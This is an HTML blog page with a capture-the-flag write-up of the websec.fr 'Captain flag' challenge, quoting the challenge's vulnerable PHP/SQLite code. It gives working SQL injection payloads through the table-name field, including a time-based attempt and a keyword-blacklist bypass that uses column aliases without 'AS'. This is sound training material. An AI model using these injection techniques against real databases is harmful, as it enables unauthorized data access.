@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics [05012020]-->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-5ZVHC0BJQ4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5ZVHC0BJQ4');
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <title>WebSec Capitain Flag | --= 0x25 =--</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="InformationsWebsec.fr is a great website to perform PHP code review. There are ~28 challenges with different difficulty levels ;) Captain flag It is a form. The input is an int. The interesting part">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebSec Capitain Flag">
+<meta property="og:url" content="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/index.html">
+<meta property="og:site_name" content="--&#x3D; 0x25 &#x3D;--">
+<meta property="og:description" content="InformationsWebsec.fr is a great website to perform PHP code review. There are ~28 challenges with different difficulty levels ;) Captain flag It is a form. The input is an int. The interesting part">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/CTF.png">
+<meta property="og:image" content="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/captain-flag.png">
+<meta property="article:published_time" content="2021-02-07T15:01:48.000Z">
+<meta property="article:modified_time" content="2021-02-07T17:31:47.793Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="websec">
+<meta property="article:tag" content="sqlite">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/CTF.png">
+  
+    <link rel="alternate" href="/atom.xml" title="--= 0x25 =--" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  <script async defer src="https://buttons.github.io/buttons.js"></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">--= 0x25 =--</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" target="_blank" rel="noopener" href="https://github.com/0x25">Github</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://0x25.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-WebSec-Capitain-Flag" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/07/WebSec-Capitain-Flag/" class="article-date">
+  <time datetime="2021-02-07T15:01:48.000Z" itemprop="datePublished">07-02-2021</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WebSec Capitain Flag
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="/2021/02/07/WebSec-Capitain-Flag/CTF.png" alt="ctf"></p>
+<h1 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h1><p><a target="_blank" rel="noopener" href="https://websec.fr/">Websec.fr</a> is a great website to perform PHP code review. There are ~28 challenges with different difficulty levels ;)</p>
+<h1 id="Captain-flag"><a href="#Captain-flag" class="headerlink" title="Captain flag"></a>Captain flag</h1><p><img src="/2021/02/07/WebSec-Capitain-Flag/captain-flag.png" alt="captain flag"></p>
+<p>It is a form. The input is an int.</p>
+<p>The interesting part of the code is in the ‘<strong>sanitize</strong>‘ function</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */</span></span><br><span class="line">    <span class="keyword">if</span> (! is_numeric (<span class="variable">$id</span>) <span class="keyword">or</span> <span class="variable">$id</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;The id must be numeric, and superior to one.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rock-solid too! */</span></span><br><span class="line">    <span class="variable">$special1</span> = [<span class="string">&quot;!&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">    <span class="variable">$special2</span> = [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;]&quot;</span>];</span><br><span class="line">    <span class="variable">$special3</span> = [<span class="string">&quot;^&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#125;&quot;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = [<span class="string">&quot;union&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;as&quot;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = array_merge (<span class="variable">$special1</span>, <span class="variable">$special2</span>, <span class="variable">$special3</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$table</span>, <span class="variable">$value</span>) !== <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;Presence of &#x27;&quot;</span> . <span class="variable">$value</span> . <span class="string">&quot;&#x27; detected: abort, abort, abort!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;table&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    sanitize(<span class="variable">$id</span>, <span class="variable">$table</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&#x27;SELECT id,username FROM &#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27; WHERE id = &#x27;</span> . <span class="variable">$id</span>;</span><br><span class="line">    <span class="comment">//$query = &#x27;SELECT id,username,enemy FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id;</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$getUsers</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$users</span> = <span class="variable">$getUsers</span>-&gt;fetchArray(SQLITE3_ASSOC);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userDetails</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$users</span>) &#123;</span><br><span class="line">        <span class="variable">$userDetails</span> = <span class="variable">$users</span>;</span><br><span class="line">    <span class="variable">$userDetails</span>[<span class="string">&#x27;table&#x27;</span>] = htmlentities(<span class="variable">$table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>First it check if <strong>$id</strong> <a target="_blank" rel="noopener" href="https://www.php.net/manual/fr/function.is-numeric.php">is_numeric</a> and <strong>$id</strong>&gt;2<br>Second it check if the is no ‘special string’ (blacklist) in table name.</p>
+<p>We can see that the SQL query is concatenate string and that always bad (<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/SQL_Injection">SQLi</a>) and it is recommended to use ‘<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">prepared statement</a>‘.</p>
+<p>In CTF there’s no hazard so column ‘enemy’ is an information. We can imagine we need to find the value enemy in id 1 \o/</p>
+<p>I do some simple test to try to inject the table value but nothing worked :/<br>So I try to bypass the $id with:</p>
+<ul>
+<li>big int</li>
+<li>0e11111 value</li>
+<li>…</li>
+</ul>
+<p>but nothing work :/</p>
+<p>So I return on SQL injection tests, on table name.<br>It is possible to inject some query in table field in HTTP Post submit (<a target="_blank" rel="noopener" href="https://portswigger.net/burp/communitydownload">Burp</a> is your friend) with:  </p>
+<details>
+  <summary>Spoiler warning</summary>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user_id&#x3D;2&amp;table&#x3D;(select id,username from costume)&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line"># this one work to </span><br><span class="line">user_id&#x3D;2&amp;table&#x3D;(select id,username from costume where id like 2)&amp;submit&#x3D;Envoyer</span><br><span class="line"></span><br><span class="line"># this work on my sql test but not on websec (blacklist &#39;+&#39; and &#39;as&#39;)</span><br><span class="line">user_id&#x3D;2&amp;table&#x3D;(select id+1 as id,username from costume where id like 1)&amp;submit&#x3D;Envoyer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</details>
+
+<p>But this don’t bypass the filter to access the id=1.</p>
+<p>I try a time base SQLi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select id,username from costume where id like 1 and substr(username,1,1) like CHAR(0X37) and randomblob(100000000) ) </span><br></pre></td></tr></table></figure>
+
+<p>It work on <a target="_blank" rel="noopener" href="https://sqliteonline.com/">sqliteonline</a> but not on websec :/</p>
+<p>After reading multiple post on the web I find <a target="_blank" rel="noopener" href="https://www.guru99.com/sqlite-query.html#2">THIS</a>. In Sqlite ‘AS’ is not mandatory in column name alias.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT StudentName &#39;Student Name&#39; FROM Students;</span><br><span class="line"># is the same as</span><br><span class="line">SELECT StudentName &#39;Student Name&#39; FROM Students;</span><br></pre></td></tr></table></figure>
+
+<p>So we can try to bypass the id column with this information and what we find before.</p>
+<p>You can use the code SQL to <a target="_blank" rel="noopener" href="https://sqliteonline.com/">generate</a> your own Table and do some test</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE costume (id integer primary key, username varchar(20), enemy varchar(20) );</span><br><span class="line"></span><br><span class="line">insert into costume (username,enemy) VALUES (&quot;Cap&#39;tain flag&quot;,&#39;&#123;FLAG&#125;&#39;);</span><br><span class="line">insert into costume (username,enemy) VALUES (&#39;Spiderman&#39;,&#39;Green Goblin&#39;);</span><br><span class="line">insert into costume (username,enemy) VALUES (&#39;Batman&#39;,&#39;The Joker&#39;);</span><br><span class="line">insert into costume (username,enemy) VALUES (&#39;Superman&#39;,&#39;Lex Luthor&#39;);</span><br></pre></td></tr></table></figure>
+
+
+<details>
+  <summary>Spoiler warning</summary>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user_id&#x3D;222&amp;table&#x3D;(select 222 id,username from costume)&amp;submit&#x3D;Envoyer</span><br><span class="line"># output Batman ??? don&#39;t understand why ... Captain is the value </span><br><span class="line">expected !? Oo</span><br><span class="line"></span><br><span class="line">user_id&#x3D;222&amp;table&#x3D;(select 222 id,enemy username from costume)&amp;submit&#x3D;Envoyer</span><br><span class="line"># output the flag</span><br><span class="line"></span><br><span class="line"># more elegant</span><br><span class="line">user_id&#x3D;222&amp;table&#x3D;(select 222 id,enemy username from costume where id like 1)&amp;submit&#x3D;Envoyer</span><br></pre></td></tr></table></figure>
+
+</details>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/" data-id="clmktquxr000iqvd4eujph3is" class="article-share-link">Share</a>
+      <a class="github-button" target="_blank" rel="noopener" href="https://github.com/0x25" data-size="large" data-show-count="true" aria-label="Follow @0x25 on GitHub">Follow @0x25</a>
+      
+        <a href="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlite/" rel="tag">sqlite</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/websec/" rel="tag">websec</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/02/14/Load-Balance-Socks5-with-Nginx/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Load Balance Socks5 with Nginx
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/01/18/HTTPS-Tunneling/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">HTTPS Tunneling</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS-TLS/" rel="tag">HTTPS/TLS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tunnel/" rel="tag">Tunnel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/apache2/" rel="tag">apache2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/binwalk/" rel="tag">binwalk</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp/" rel="tag">burp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/challenge/" rel="tag">challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cntlm/" rel="tag">cntlm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crowdsec/" rel="tag">crowdsec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/discord/" rel="tag">discord</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackthebox/" rel="tag">hackthebox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hidden-service/" rel="tag">hidden service</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lua/" rel="tag">lua</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/minecraft/" rel="tag">minecraft</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socks/" rel="tag">socks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socks5/" rel="tag">socks5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlite/" rel="tag">sqlite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssf/" rel="tag">ssf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcpproxy/" rel="tag">tcpproxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tor/" rel="tag">tor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unix-socket/" rel="tag">unix socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/websec/" rel="tag">websec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/" rel="tag">wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/x-forwarded-for/" rel="tag">x-forwarded-for</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zero-day/" rel="tag">zero-day</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/HTTPS-TLS/" style="font-size: 10px;">HTTPS/TLS</a> <a href="/tags/Tunnel/" style="font-size: 10px;">Tunnel</a> <a href="/tags/apache2/" style="font-size: 10px;">apache2</a> <a href="/tags/binwalk/" style="font-size: 10px;">binwalk</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/challenge/" style="font-size: 20px;">challenge</a> <a href="/tags/cntlm/" style="font-size: 10px;">cntlm</a> <a href="/tags/crowdsec/" style="font-size: 10px;">crowdsec</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/discord/" style="font-size: 10px;">discord</a> <a href="/tags/docker/" style="font-size: 20px;">docker</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hackthebox/" style="font-size: 20px;">hackthebox</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/hidden-service/" style="font-size: 10px;">hidden service</a> <a href="/tags/lua/" style="font-size: 10px;">lua</a> <a href="/tags/minecraft/" style="font-size: 10px;">minecraft</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/socks/" style="font-size: 20px;">socks</a> <a href="/tags/socks5/" style="font-size: 10px;">socks5</a> <a href="/tags/sqlite/" style="font-size: 10px;">sqlite</a> <a href="/tags/ssf/" style="font-size: 10px;">ssf</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tcp/" style="font-size: 10px;">tcp</a> <a href="/tags/tcpproxy/" style="font-size: 10px;">tcpproxy</a> <a href="/tags/tor/" style="font-size: 10px;">tor</a> <a href="/tags/unix-socket/" style="font-size: 10px;">unix socket</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/websec/" style="font-size: 10px;">websec</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/x-forwarded-for/" style="font-size: 10px;">x-forwarded-for</a> <a href="/tags/zero-day/" style="font-size: 10px;">zero-day</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/09/15/Block-malicious-IP-behind-reverse-proxy-with-Apache2-and-Crowdsec/">Block malicious IP behind reverse proxy with Apache2 and Crowdsec</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/Patch-TCP-packets-on-the-fly/">Patch TCP packets on the fly</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/03/Zero-day-in-industrial-wifi-equipment/">Zero-day in industrial wifi equipment</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/02/Create-your-hidden-Tor-service-with-unix-socket/">Create your hidden Tor service with unix socket</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/10/Docker-SSH-on-the-fly/">Docker SSH on the fly</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+    <div>
+      <a class="github-button" target="_blank" rel="noopener" href="https://github.com/0x25" data-size="large" data-show-count="true" aria-label="Follow @0x25 on GitHub">Follow @0x25</a
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/0x25" class="mobile-nav-link">Github</a>
+  
+</nav>
+    
+<script>
+  var disqus_shortname = 'https-0x25-github-io';
+  
+  var disqus_url = 'https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
